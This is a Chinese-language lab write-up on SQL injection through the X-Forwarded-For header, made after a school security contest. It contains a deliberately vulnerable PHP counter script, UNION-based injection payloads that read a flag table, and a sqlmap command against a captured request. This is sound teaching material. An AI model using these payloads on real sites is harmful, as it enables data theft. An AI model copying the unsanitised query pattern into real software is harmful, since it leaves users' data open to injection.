##X-FORWARDED-FOR SQL Injection

###0x01
#####XFF注入
最近在学校办的信安比赛中遇到了个XFF漏洞，之前没有接触，比赛完了总结一下，自己搭了个环境，做了个poc


>测试代码
 
```
	<?php
		error_reporting(E_ALL ^ E_NOTICE);
		include "config.php";
		
		if($_SERVER["HTTP_X_FORWARDED_FOR"]) {
			$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
		}
		else {
			$ip = $_SERVER["REMOTE_ADDR"];
		}
		$flag = true;
		
		$select = mysql_query("SELECT ip FROM record");
		while($row = mysql_fetch_array($select))
		{
			if(!strcmp($ip, $row['ip'])) {
				$flag = false;
			}
		}
		
		if($flag == true) {
			$command = "insert into record(ip,count) values('".$ip."',1)";
			mysql_query($command);
		}
		
		else {
			$command = "update record set count=count+1 where ip='".$ip."' ";
			mysql_query($command);
		}
		$count = mysql_query("select * from record where ip='".$ip."' ");
		while($result = mysql_fetch_array($count)) {
			echo "Welcome " . $ip . ", This is count " . $result['count'] . "</br>";
		}
	?>
```

>数据库结构

Table：record
```
	id		ip		count
	1		10.0.0.1		1
	2		10.0.0.2		2
	3		192.168.0.1	20
```
Table:flag(for test)
```
	flag		values
	Flag		Y0u_Ar3_G00d
```


###0x02
#####注入poc

使用burpsuite截断，转入到Repeater，添加X-FORWARDED-FOR参数，value为192.168.0.1，发现ip变为了192.168.0.1，count重新开始计算  
修改xff值为192.168.0.1'   发现报了错误，value=192.168.0.1'#时不报错，确定注入点。
  
查看列数：xff = 192.168.0.1' order by 3#
查看回显位：xff=192.168.0.1' and 1=2 union select 1,2,3 from record#
查询flag值：xff=192.168.0.1' and 1=2 union select 1,2,value from flag#

</br>
>使用sqlmap试试    

使用burpsuite截取包后，添加XFF参数
```
	GET /XFF_injection/index.php HTTP/1.1
	Host: 127.0.0.1
	Proxy-Connection: keep-alive
	Cache-Control: max-age=0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 
	(KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
	Accept-Encoding: gzip, deflate, sdch
	Accept-Language: zh-CN,zh;q=0.8
	X-Forwarded-For: 192.168.0.1
```
命名为1.txt，丢入sqlmap  
sqlmap -r 1.txt --dbs  

就出数据库了。。。。。。。  


</br>
Q&A：  
Q:sql语句语句中 union 的作用是？
A:UNION 操作符用于合并两个或多个 SELECT 语句的结果集。

Q:sql注入中的回显位是什么？
A:以上面的record表和测试用例为例，通过xff=192.168.0.1' and 1=2 union select 1,2,3 from record#  看到输出结果是三，表示php代码中，将select查询语句执行后，选取了第三个列名作为数据源来输出。在构造sql注入语句时，应该在该回显位上写入我们需要的列名，这样才能看到输出结果。